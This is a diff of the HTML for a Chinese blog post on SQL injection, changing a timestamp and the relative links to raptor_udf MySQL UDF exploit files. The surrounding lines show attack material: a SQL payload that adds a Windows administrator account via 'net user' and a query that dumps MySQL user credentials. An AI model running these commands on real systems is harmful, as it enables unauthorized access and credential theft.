@@ -128,7 +128,7 @@
 <meta property="og:description" content="SQL注入攻击 宽字节注入  &amp;emsp;&amp;emsp;宽字节注入原理： &amp;emsp;&amp;emsp;GBK 占用两字节，ASCII占用一字节。PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。 &amp;emsp;&amp;emsp;在客户端输入字符&amp;#39;被PHP转义成\&amp;#39;，\&amp;#39;编码是%5c%27。">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://cloudofzm.cn/2018/04/22/SQLInjectionAttack/1.png">
-<meta property="og:updated_time" content="2018-05-01T09:17:09.000Z">
+<meta property="og:updated_time" content="2018-05-01T09:22:21.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入攻击">
 <meta name="twitter:description" content="SQL注入攻击 宽字节注入  &amp;emsp;&amp;emsp;宽字节注入原理： &amp;emsp;&amp;emsp;GBK 占用两字节，ASCII占用一字节。PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。 &amp;emsp;&amp;emsp;在客户端输入字符&amp;#39;被PHP转义成\&amp;#39;，\&amp;#39;编码是%5c%27。">
@@ -692,8 +692,8 @@ SELECT &apos;net user x x /add%26%26 net localgroup administrators x /add&apos; 
 <pre><code>SELECT concat(user,&quot;:&quot;,password) FROM mysql.user
 </code></pre><p>&emsp;&emsp;<strong>直接攻击数据库：</strong></p>
 <p>&emsp;&emsp;通过直接连接数据库并创建用户自定义函数来执行代码。</p>
-<p>&emsp;&emsp;基于UNIX：<a href="SQLInjectionAttack/raptor_udf.c">raptor_udf.c</a> | <a href="SQLInjectionAttack/raptor_udf2.c">raptor_udf2.c</a></p>
-<p>&emsp;&emsp;基于Windows： <a href="SQLInjectionAttack/raptor_winudf.zip">raptor_winudf.zip</a> （解压密码：0xdeadbeef）</p>
+<p>&emsp;&emsp;基于UNIX：<a href="raptor_udf.c">raptor_udf.c</a> | <a href="raptor_udf2.c">raptor_udf2.c</a></p>
+<p>&emsp;&emsp;基于Windows： <a href="raptor_winudf.zip">raptor_winudf.zip</a> （解压密码：0xdeadbeef）</p>
 <p>&emsp;&emsp;代码来自：<a href="http://www.0xdeadbeef.info" target="_blank" rel="noopener">0xdeadbeef.info</a></p>
 <p>&emsp;&emsp;<strong>读写文件：</strong></p>
 <pre><code># 读取文件
